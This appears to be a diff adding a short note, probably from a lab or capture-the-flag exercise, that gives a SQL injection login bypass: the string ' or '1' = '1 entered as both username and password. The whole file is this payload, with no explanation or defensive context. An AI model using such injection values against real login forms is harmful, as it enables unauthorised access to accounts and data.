@@ -1,0 +1,4 @@
+Bypass the login using :
+
+Username:  ' or '1' = '1
+passsword :  ' or '1' = '1
